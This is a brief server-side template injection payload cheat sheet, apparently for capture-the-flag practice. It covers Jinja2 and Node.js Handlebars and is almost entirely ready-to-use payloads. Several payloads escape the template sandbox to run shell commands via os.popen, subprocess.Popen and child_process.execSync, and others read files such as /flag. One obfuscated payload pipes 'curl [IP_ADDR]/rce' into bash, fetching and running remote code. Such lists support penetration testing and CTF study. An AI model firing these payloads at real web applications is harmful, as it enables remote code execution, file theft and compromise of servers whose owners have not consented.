# Server-Side Template Injection (SSTI)

```
${{<%[%'"}}%    # Special characteres for detection
{{7*7}}
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl [IP_ADDR]/rce | bash")|attr("read")()}}
```

## Python

### Jinja2

```
http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__() }}   # To list all objects
http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}   # Using subprocess.Popen index in 401 to achieve rce
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}
{{request.__class__._load_form_data.__globals__.__builtins__.open("/flag").read() }}
{{ get_flashed_messages.__globals__.__builtins__.open("/flag").read() }}
```

Ref: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

## Node.js Express middleware

```
{{#with "s" as |string|}}
	{{#with "e"}}
		{{#with split as |conslist|}}
			{{this.pop}}
			{{this.push (lookup string.sub "constructor")}}
			{{this.pop}}
			{{#with string.split as |codelist|}}
				{{this.pop}}
				{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
				{{this.pop}}
				{{#each conslist}}
					{{#with (string.sub.apply 0 codelist)}}
						{{this}}
					{{/with}}
				{{/each}}
			{{/with}}
		{{/with}}
	{{/with}}
{{/with}}
```
